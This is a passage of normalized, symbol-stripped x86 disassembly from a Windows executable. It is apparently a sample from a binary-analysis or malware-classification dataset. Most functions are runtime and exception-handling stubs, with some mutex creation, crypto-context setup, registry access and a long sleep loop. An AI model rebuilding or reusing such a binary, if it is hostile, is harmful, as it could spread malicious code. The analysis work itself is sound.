mov [ esp + 0x10 ] 0x70243101
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_40f29b
mov esi eax
call sub_40e269
pop esi
mov esp ebp
pop ebp
retn
sub_41ba72
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_410a2b
mov [ esp + 0x10 ] 0x80673201
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
mov esp ebp
pop ebp
retn
sub_41bad6
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_414eb2
mov [ esp + 0x10 ] 0x80361901
mov [ esp + 0x14 ] 0x3e8
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
mov esp ebp
pop ebp
retn
sub_41bb1a
mov eax sub_41b184
call sub_416a8c
push esi
mov esi rw-data
call sub_40c9fb
or [ esp + 0xc ] 0xffffffff
push sub_41bd93
call sub_4023d4
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bb4d
mov eax sub_41b198
call sub_416a8c
push esi
mov esi rw-data
call sub_40c9fb
or [ esp + 0xc ] 0xffffffff
push sub_41bdbb
call sub_4023d4
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bb80
mov eax sub_41b1ac
call sub_416a8c
push esi
mov esi rw-data
call sub_40c9fb
or [ esp + 0xc ] 0xffffffff
push r-xdata
call sub_4023d4
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bbb3
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_4076bf
mov [ esp + 0x10 ] 0x70941101
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x0
call sub_40f29b
mov esi eax
call sub_40e269
pop esi
mov esp ebp
pop ebp
retn
sub_4010c5
mov eax [ ecx + 0xc ]
retn
sub_401126
mov eax sub_41b039
call sub_416a8c
push ecx
mov [ ebp - 0x10 ] ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_4025fd
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_401149
mov eax sub_41b01f
call sub_416a8c
push ecx
mov [ ebp - 0x10 ] ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_4025fd
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_4012a4
push rw-data
call [ LeaveCriticalSection@IAT ]
retn
sub_4012b0
call sub_40f29b
push [ esp + 0x4 ]
call sub_412d05
retn
sub_401320
push ecx
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push esi
call sub_401331
pop ecx
retn
sub_40141f
mov eax [ esi ]
test eax eax
je r-xdata
retn
push eax
push 0x0
call [ KillTimer@IAT ]
and [ esi ] 0x0
sub_401523
mov eax sub_41b05d
call sub_416a8c
push ecx
push esi
or [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp + 0x8 ]
call sub_40c938
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
sub_4023ce
call sub_402bbf
retn
sub_4023d4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_402398
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_402525
mov eax ecx
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x0
retn
sub_402536
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_402583
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_4040eb
pop ecx
sub_4025fd
mov [ ecx ] r--data
jmp sub_402583
sub_402678
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4040eb
sub_402683
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_4041ba
pop ecx
retn
sub_402906
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_404599
pop ecx
pop ecx
retn
sub_40291a
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_402e31
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_402ea5
retn
push eax
call sub_402e0c
_start
call sub_404db9
jmp sub_4027d7
sub_402a51
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_402b9e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_402b73
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_402bb6
push 0x8
call sub_4052ec
pop ecx
retn
sub_402bbf
push 0x8
call sub_405213
pop ecx
retn
sub_402de1
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_405213
pop ecx
sub_402df6
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_402cb6
add esp 0xc
pop ebp
retn
sub_402e0c
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_402cb6
add esp 0xc
pop ebp
retn
sub_402e22
push 0x1
push 0x0
push 0x0
call sub_402cb6
add esp 0xc
retn
sub_402e31
push 0x1
push 0x1
push 0x0
call sub_402cb6
add esp 0xc
retn
sub_402e40
mov edi edi
push ebp
mov ebp esp
call sub_404560
push [ ebp + 0x8 ]
call sub_4043b1
pop ecx
push 0xff
call sub_402e0c
int3
sub_402ea5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40330d
push 0xd
call sub_405213
pop ecx
retn
sub_4036dc
push 0xd
call sub_405213
pop ecx
retn
sub_403715
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40357b
pop ecx
mov [ rw-data ] 0x1
sub_403a60
push 0xc
call sub_405213
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_403a6c
push 0x0
call [ EncodePointer@IAT ]
retn
sub_403a75
call [ TlsAlloc@IAT ]
retn 0x4
sub_403b91
push 0xd
call sub_405213
pop ecx
retn
sub_403b9a
push 0xc
call sub_405213
pop ecx
retn
sub_403d50
push 0xd
call sub_405213
pop ecx
retn
sub_403d5c
push 0xc
call sub_405213
pop ecx
retn
sub_404125
push 0x8
push r--data
call sub_402e60
call sub_403c1c
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40611c
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_404145
xor eax eax
inc eax
retn
sub_40415e
call sub_403c1c
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_404125
call eax
sub_404195
xor eax eax
inc eax
retn
sub_4041a9
push sub_404125
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_404221
push 0xe
call sub_405213
pop ecx
retn
sub_4042b8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40437d
push sub_40433b
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_404d9b
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_404f83
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405213
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4052e3
push 0xa
call sub_405213
pop ecx
retn
sub_40531f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_405374
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_4054e8
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_405213
pop ecx
sub_405524
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405533
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40568b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_4056bc
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_40689a
retn
sub_4057a6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_4056d0
add esp 0xc
pop ebp
retn 0x4
sub_4057d9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_406ab5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40580b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_4056d0
add esp 0xc
pop ebp
retn 0x8
sub_40650d
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_4064ba
add esp 0x10
pop ebp
retn
sub_406891
push 0x2
call sub_402e40
sub_406a89
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4069c0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_406ad4
call eax
retn
sub_406ba0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_406c70
sub_406bb6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_406c70
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_407083
push [ esp + 0x4 ]
push 0x1
push 0x0
call [ CreateMutexW@IAT ]
retn
sub_4072ae
mov [ ebp - 0x4 ] 0x5
mov eax sub_4072bb
retn
sub_4089dd
xor al al
retn
sub_409c5a
push 0xf0000000
xor ecx ecx
push 0x18
push ecx
push ecx
push eax
mov [ eax ] ecx
call [ CryptAcquireContextW@IAT ]
test eax eax
setne al
retn
sub_40c642
mov eax [ ecx + 0x4 ]
cmp [ esp + 0x4 ] eax
jle r-xdata
sub eax [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
xor al al
jmp r-xdata
retn 0x4
sub_40c680
push esi
mov esi eax
call sub_40c607
mov eax [ esi + 0x58cc ]
pop esi
retn
sub_40ce2a
push 0x0
call [ SetLastError@IAT ]
push [ esp + 0x4 ]
call [ EnterCriticalSection@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_40d32b
push [ esp + 0x4 ]
call sub_40d0df
cmp [ rw-data ] 0x0
mov eax rw-data
jne r-xdata
retn 0x4
mov eax r--data
sub_40d762
call [ GetLastError@IAT ]
neg eax
sbb eax eax
not eax
and eax [ esp + 0x4 ]
retn 0x4
CloseHandle
jmp [ CloseHandle@IAT ]
sub_40e645
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al 0x1
push [ esp + 0x4 ]
call eax
neg eax
sbb eax eax
neg eax
jmp r-xdata
retn 0x4
sub_40e661
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al 0x1
push [ esp + 0x4 ]
call eax
neg eax
sbb eax eax
neg eax
jmp r-xdata
retn 0x4
sub_40e6aa
mov eax [ eax + 0x58b8 ]
retn
sub_40e6b1
mov eax [ eax + 0x58b4 ]
retn
sub_40e732
mov eax [ eax + 0x5768 ]
retn
sub_40e739
mov [ eax + 0x5768 ] ecx
retn
sub_40e740
xor eax eax
retn 0x4
sub_40e9e9
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax [ rw-data ]
retn
and [ rw-data ] 0x0
push rw-data
push sub_40e60e
call sub_40e1b3
sub_40eb63
push sub_40eb1f
call sub_402654
pop ecx
retn
sub_40ebb4
mov eax [ ebp + 0x8 ]
inc [ eax + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_40ec2e
mov eax [ ebp + 0x8 ]
inc [ eax + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov eax sub_40ec3e
retn
sub_40ecbe
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
inc [ eax ]
or [ ebp - 0x4 ] 0xffffffff
mov eax sub_40ecd0
retn
sub_40f058
call sub_40e9e9
xor ecx ecx
cmp ecx eax
sbb eax eax
neg eax
retn
sub_40fc21
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
j_sub_40ce6c
jmp sub_40ce6c
sub_4102e6
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor al al
push 0x410
push [ esp + 0x8 ]
push rw-data
call [ lstrcpynW@IAT ]
mov al 0x1
jmp r-xdata
retn 0x4
sub_410a0f
push ecx
push sub_410593
push 0x0
push 0x1
push r--data
mov edx 0x80000001
call sub_40c30b
mov al 0x1
retn
sub_412452
mov eax [ eax + 0x8 ]
xor edx edx
push 0xd
pop ecx
div ecx
neg eax
sbb al al
inc al
retn
sub_4125dc
push esi
lea esi [ edi + 0x4 ]
call sub_40c90c
lea esi [ edi + 0x14 ]
call sub_40c90c
mov al 0x1
pop esi
retn
sub_4129a3
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_4129ad
push ecx
push [ esp + 0xc ]
mov al 0x8
push [ esp + 0xc ]
mov ecx 0x6036f71f
call sub_41283b
pop ecx
retn 0x8
sub_4129c6
push ecx
push [ esp + 0xc ]
mov al 0x7
push [ esp + 0xc ]
call sub_41283b
pop ecx
retn 0x8
sub_412a64
test edx edx
je r-xdata
xor al al
test eax eax
je r-xdata
add eax eax
push eax
push [ esp + 0x8 ]
mov al 0x6
call sub_41283b
jmp r-xdata
retn 0x4
j_sub_412a64
jmp sub_412a64
sub_412e87
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_4135c2
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor al al
retn 0x8
cmp [ esp + 0x8 ] 0x1
jle r-xdata
jmp sub_413461
sub_4135da
push ecx
and [ rw-data ] 0x0
and [ rw-data ] 0x0
call sub_40e9bf
mov [ rw-data ] eax
pop ecx
retn
sub_415ede
push ebp
mov ebp esp
and esp 0xfffffff8
push [ ebp + 0x8 ]
call sub_415cbe
mov [ esp ] 0x1b7740
call [ Sleep@IAT ]
jmp r-xdata
sub_415efb
push ecx
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x80cd9102
push 0x80cd9101
call sub_40f29b
push eax
call sub_40ded2
pop ecx
retn
sub_4165bf
mov eax sub_417555
mov [ rw-data ] eax
mov [ rw-data ] sub_416c4b
mov [ rw-data ] sub_416bff
mov [ rw-data ] sub_416c38
mov [ rw-data ] sub_416ba1
mov [ rw-data ] eax
mov [ rw-data ] sub_4174cd
mov [ rw-data ] sub_416bbd
mov [ rw-data ] sub_416b1f
mov [ rw-data ] sub_416aab
retn
sub_41661f
mov edi edi
push ebp
mov ebp esp
call sub_4165bf
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_417578
sub_416a8c
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_416bff
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416bbd
add esp 0x10
pop ebp
retn
sub_416c38
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_416aab
pop ecx
pop ecx
pop ebp
retn
sub_416c4b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_416b1f
pop ecx
pop ecx
pop ebp
retn
sub_4175a0
mov [ ecx ] r--data
jmp sub_4025fd
sub_4176fe
push [ ebp - 0x14 ]
call sub_417631
pop ecx
retn
sub_417742
call sub_403c1c
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_403c1c
dec [ eax + 0x90 ]
sub_4177e4
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_4177ed
mov esp [ ebp - 0x18 ]
call sub_404125
sub_417895
push 0x4
mov eax sub_41b22f
call sub_4187fe
call sub_403c1c
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40415e
call sub_404171
sub_41796e
mov eax [ ebp - 0x14 ]
call sub_41775c
retn
sub_417be5
xor eax eax
inc eax
retn
sub_417be9
mov esp [ ebp - 0x18 ]
call sub_404125
sub_417c7e
xor eax eax
inc eax
retn
sub_417c82
mov esp [ ebp - 0x18 ]
call sub_404125
sub_418175
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40262f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_418834
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_41a90d
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_41a952
mov ecx [ ebp + 0x8 ]
jmp sub_4025fd
sub_41a95a
mov eax r--data
jmp sub_416735
sub_41a964
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_41a972
mov eax r--data
jmp sub_416735
sub_41a97c
mov ebx [ ebp - 0x10 ]
add ebx 0x4e80
jmp sub_4010c9
sub_41a98a
mov eax r--data
jmp sub_416735
sub_41a994
mov ecx [ ebp + 0x8 ]
jmp sub_401149
sub_41a99c
mov eax r--data
jmp sub_416735
sub_41a9a6
mov eax r--data
jmp sub_416735
sub_41a9b0
mov eax r--data
jmp sub_416735
sub_41a9ba
mov eax r--data
jmp sub_416735
sub_41a9c4
mov eax r--data
jmp sub_416735
sub_41a9ce
mov eax r--data
jmp sub_416735
sub_41a9d8
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_41a9e6
mov eax r--data
jmp sub_416735
sub_41a9f0
mov ebx [ ebp - 0x10 ]
add ebx 0x4e80
jmp sub_4010c9
sub_41a9fe
mov eax r--data
jmp sub_416735
j_sub_4012a4
jmp sub_4012a4
sub_41aa0d
mov eax r--data
jmp sub_416735
sub_41aa17
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_41aa25
mov eax r--data
jmp sub_416735
sub_41aa2f
lea esi [ ebp - 0x24 ]
jmp sub_40c938
sub_41aa37
mov eax r--data
jmp sub_416735
sub_41aa41
lea esi [ ebp - 0x34 ]
jmp sub_40c938
sub_41aa49
mov eax r--data
jmp sub_416735
sub_41aa53
lea esi [ ebp - 0x2c ]
jmp sub_40c938
sub_41aa5b
mov eax r--data
jmp sub_416735
sub_41aa65
lea eax [ ebp - 0xf8 ]
jmp sub_4015aa
sub_41aa70
mov eax r--data
jmp sub_416735
sub_41aa7a
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_40c938
sub_41aa85
mov esi [ ebp + 0x8 ]
add esi 0x14
jmp sub_40c938
sub_41aa90
mov eax r--data
jmp sub_416735
sub_41aa9a
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_40c938
sub_41aaa5
mov esi [ ebp + 0x8 ]
add esi 0x14
jmp sub_40c938
sub_41aab0
mov eax r--data
jmp sub_416735
sub_41aaba
mov esi [ ebp - 0x10 ]
jmp sub_40c938
sub_41aac2
mov eax r--data
jmp sub_416735
sub_41aacc
mov esi [ ebp - 0x10 ]
jmp sub_40c938
sub_41aad4
mov eax r--data
jmp sub_416735
sub_41aade
lea eax [ ebp - 0x5c ]
push eax
call sub_4125f1
retn
sub_41aae8
lea esi [ ebp - 0x38 ]
jmp sub_40c938
sub_41aaf0
lea esi [ ebp - 0x28 ]
jmp sub_40c938
sub_41aaf8
mov eax r--data
jmp sub_416735
sub_41ab02
lea eax [ ebp - 0x4c ]
push eax
call sub_4125f1
retn
sub_41ab0c
lea esi [ ebp - 0x28 ]
jmp sub_40c938
sub_41ab14
mov eax r--data
jmp sub_416735
sub_41ab1e
lea esi [ ebp - 0x20 ]
jmp sub_40c938
sub_41ab26
lea esi [ ebp - 0x30 ]
jmp sub_40c938
sub_41ab2e
mov eax r--data
jmp sub_416735
sub_41ab38
lea eax [ ebp - 0x50 ]
push eax
call sub_4125f1
retn
sub_41ab42
lea esi [ ebp - 0x2c ]
jmp sub_40c938
sub_41ab4a
mov eax r--data
jmp sub_416735
sub_41ab54
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0xc ]
call sub_4125f1
sub_41ab6d
lea esi [ ebp - 0x24 ]
jmp sub_40c938
sub_41ab75
mov eax r--data
jmp sub_416735
sub_41ab7f
push [ ebp - 0x18 ]
call sub_4125f1
retn
sub_41ab88
lea esi [ ebp - 0x28 ]
jmp sub_40c938
sub_41ab90
mov eax r--data
jmp sub_416735
sub_41ab9a
lea esi [ ebp - 0x2c ]
jmp sub_40c938
sub_41aba2
mov eax r--data
jmp sub_416735
sub_41abac
mov eax r--data
jmp sub_416735
sub_41abb6
mov esi [ ebp - 0x14 ]
jmp sub_40c938
sub_41abbe
push [ ebp - 0x10 ]
call sub_401523
retn
sub_41abc7
mov eax r--data
jmp sub_416735
sub_41abd1
lea esi [ ebp - 0x1770 ]
jmp sub_40c938
sub_41abdc
lea esi [ ebp - 0x1754 ]
jmp sub_40c938
sub_41abe7
lea esi [ ebp - 0x1734 ]
jmp sub_40c938
sub_41abf2
lea esi [ ebp - 0x1744 ]
jmp sub_40c938
sub_41abfd
mov eax r--data
jmp sub_416735
sub_41ac07
lea eax [ ebp - 0x106c ]
push eax
call sub_4125f1
retn
sub_41ac14
lea esi [ ebp - 0x1040 ]
jmp sub_40c938
sub_41ac1f
lea esi [ ebp - 0x1030 ]
jmp sub_40c938
sub_41ac2a
lea esi [ ebp - 0x107c ]
jmp sub_40c938
sub_41ac35
mov eax r--data
jmp sub_416735
sub_41ac3f
lea esi [ ebp - 0x34 ]
jmp sub_40c938
sub_41ac47
mov eax r--data
jmp sub_416735
sub_41ac51
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_41ac5f
mov eax r--data
jmp sub_416735
sub_41ac69
lea eax [ ebp - 0x50 ]
push eax
call sub_4125f1
retn
sub_41ac73
lea esi [ ebp - 0x60 ]
jmp sub_40c938
sub_41ac7b
mov eax r--data
jmp sub_416735
sub_41ac85
lea esi [ ebp - 0x20 ]
jmp sub_40c938
sub_41ac8d
mov eax r--data
jmp sub_416735
sub_41ac97
lea esi [ ebp - 0x3024 ]
jmp sub_40c938
sub_41aca2
mov eax r--data
jmp sub_416735
sub_41acac
lea esi [ ebp - 0x4038 ]
jmp sub_40c938
sub_41acb7
mov eax r--data
jmp sub_416735
sub_41acc1
lea esi [ ebp - 0x30 ]
jmp sub_40c938
sub_41acc9
lea eax [ ebp - 0x30 ]
push eax
call sub_401523
retn
sub_41acd3
lea esi [ ebp - 0x30 ]
jmp sub_40c938
sub_41acdb
mov eax r--data
jmp sub_416735
sub_41ace5
mov esi [ ebp - 0x14 ]
jmp sub_40c938
sub_41aced
push [ ebp - 0x10 ]
call sub_401523
retn
sub_41acf6
mov eax r--data
jmp sub_416735
sub_41ad00
lea eax [ ebp - 0xf4 ]
push eax
call sub_4125f1
retn
sub_41ad0d
lea eax [ ebp - 0x34 ]
push eax
call sub_4125f1
retn
sub_41ad17
mov eax r--data
jmp sub_416735
sub_41ad21
lea eax [ ebp - 0x458 ]
push eax
call sub_4125f1
retn
sub_41ad2e
lea eax [ ebp - 0x434 ]
push eax
call sub_4125f1
retn
sub_41ad3b
mov eax r--data
jmp sub_416735
sub_41ad45
lea eax [ ebp - 0x458 ]
push eax
call sub_4125f1
retn
sub_41ad52
lea eax [ ebp - 0x434 ]
push eax
call sub_4125f1
retn
sub_41ad5f
mov eax r--data
jmp sub_416735
sub_41ad69
lea eax [ ebp - 0x58 ]
push eax
call sub_4125f1
retn
sub_41ad73
lea eax [ ebp - 0x34 ]
push eax
call sub_4125f1
retn
sub_41ad7d
mov eax r--data
jmp sub_416735
sub_41ad87
lea esi [ ebp - 0x37c ]
jmp sub_40c938
sub_41ad92
lea eax [ ebp - 0x358 ]
push eax
call sub_4125f1
retn
sub_41ad9f
lea eax [ ebp - 0x334 ]
push eax
call sub_4125f1
retn
sub_41adac
mov eax r--data
jmp sub_416735
sub_41adb6
lea esi [ ebp - 0x2f8 ]
jmp sub_40c938
sub_41adc1
lea eax [ ebp - 0x2d8 ]
push eax
call sub_4125f1
retn
sub_41adce
lea eax [ ebp - 0x2b4 ]
push eax
call sub_4125f1
retn
sub_41addb
mov eax r--data
jmp sub_416735
sub_41ade5
lea esi [ ebp - 0x48c ]
jmp sub_40c938
sub_41adf0
lea esi [ ebp - 0x47c ]
jmp sub_40c938
sub_41adfb
mov eax r--data
jmp sub_416735
sub_41ae05
lea esi [ ebp - 0x3024 ]
jmp sub_40c938
sub_41ae10
mov eax r--data
jmp sub_416735
sub_41ae1a
lea eax [ ebp - 0x58 ]
push eax
call sub_4125f1
retn
sub_41ae24
lea esi [ ebp - 0xa4 ]
jmp sub_40c938
sub_41ae2f
lea eax [ ebp - 0x34 ]
push eax
call sub_4125f1
retn
sub_41ae39
mov eax r--data
jmp sub_416735
sub_41ae43
lea esi [ ebp - 0x20 ]
jmp sub_40c938
sub_41ae4b
lea esi [ ebp - 0x30 ]
jmp sub_40c938
sub_41ae53
mov eax r--data
jmp sub_416735
sub_41ae5d
lea esi [ ebp - 0x1c ]
jmp sub_40c938
sub_41ae65
mov eax r--data
jmp sub_416735
sub_41ae6f
lea eax [ ebp - 0x23c ]
push eax
call sub_4125f1
retn
sub_41ae7c
lea eax [ ebp - 0x274 ]
jmp sub_40154a
sub_41ae87
lea esi [ ebp - 0x24c ]
jmp sub_40c938
sub_41ae92
lea esi [ ebp - 0x284 ]
jmp sub_40c938
sub_41ae9d
mov eax r--data
jmp sub_416735
sub_41aea7
lea esi [ ebp - 0x44 ]
jmp sub_401320
sub_41aeaf
lea esi [ ebp - 0x3c ]
jmp sub_40141f
sub_41aeb7
lea esi [ ebp - 0x40 ]
jmp sub_40141f
sub_41aebf
mov eax r--data
jmp sub_416735
sub_41aec9
lea eax [ ebp - 0x478 ]
jmp sub_40bed6
sub_41aed4
mov eax r--data
jmp sub_416735
sub_41aede
lea eax [ ebp - 0x270 ]
jmp sub_40bed6
sub_41aee9
lea esi [ ebp - 0x2a0 ]
jmp sub_40c938
sub_41aef4
lea esi [ ebp - 0x290 ]
jmp sub_40c938
sub_41aeff
lea eax [ ebp - 0x290 ]
push eax
call sub_401523
retn
sub_41af0c
lea esi [ ebp - 0x280 ]
jmp sub_40c938
sub_41af17
lea eax [ ebp - 0x280 ]
push eax
call sub_401523
retn
sub_41af24
mov eax r--data
jmp sub_416735
sub_41af2e
lea esi [ ebp - 0x688 ]
jmp sub_40c938
sub_41af39
mov eax r--data
jmp sub_416735
sub_41af43
mov esi [ ebp - 0x14 ]
jmp sub_40c938
sub_41af4b
lea eax [ ebp - 0x4c ]
push eax
call sub_401523
retn
sub_41af55
mov esi [ ebp - 0x14 ]
jmp sub_40c938
sub_41af5d
lea eax [ ebp - 0x3c ]
push eax
call sub_401523
retn
sub_41af67
lea esi [ ebp - 0x24 ]
jmp sub_40c938
sub_41af6f
lea eax [ ebp - 0x54 ]
push eax
call sub_401eef
retn
sub_41af79
lea eax [ ebp - 0x4c ]
push eax
call sub_401523
retn
sub_41af83
lea eax [ ebp - 0x3c ]
push eax
call sub_401523
retn
sub_41af8d
lea esi [ ebp - 0x24 ]
jmp sub_40c938
sub_41af95
mov esi [ ebp + 0x8 ]
jmp sub_40c938
sub_41af9d
mov esi [ ebp + 0x8 ]
jmp sub_40c938
sub_41afa5
lea eax [ ebp - 0x4c ]
push eax
call sub_401523
retn
sub_41afaf
lea eax [ ebp - 0x3c ]
push eax
